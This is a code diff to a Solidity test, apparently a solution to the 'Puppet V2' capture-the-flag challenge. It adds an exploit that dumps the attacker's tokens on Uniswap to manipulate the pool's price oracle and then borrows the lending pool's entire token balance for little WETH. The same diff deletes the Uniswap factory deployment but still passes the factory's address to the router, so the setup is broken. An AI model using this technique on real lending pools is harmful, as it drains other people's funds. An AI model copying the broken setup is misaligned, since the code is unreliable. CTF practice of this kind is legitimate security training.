@@ -53,10 +53,7 @@ contract PuppetV2 is Test {
         weth = new WETH9();
         vm.label(address(weth), "WETH");
 
-        // Deploy Uniswap Factory and Router
-        uniswapV2Factory =
-            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));
-
+   
         uniswapV2Router = IUniswapV2Router02(
             deployCode(
                 "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
@@ -99,11 +96,37 @@ contract PuppetV2 is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitPuppetv2() public {
         /**
          * EXPLOIT START *
          */
+vm.startPrank(attacker);
+    address[] memory path = new address[](2);
+    path[0] = address(dvt);
+    path[1] = address(weth);
 
+    dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+    uniswapV2Router.swapExactTokensForETH(
+        ATTACKER_INITIAL_TOKEN_BALANCE,
+        1, // Accept any amount of ETH
+        path,
+        attacker,
+       DEADLINE
+    );
+   
+     // 3. Convert received ETH to WETH
+    uint256 attackerBalance = attacker.balance;
+    weth.deposit{value: attackerBalance}();
+
+uint256 depositRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+
+  weth.approve(address(puppetV2Pool), depositRequired);
+
+
+    puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+    vm.stopPrank();
         /**
          * EXPLOIT END *
          */
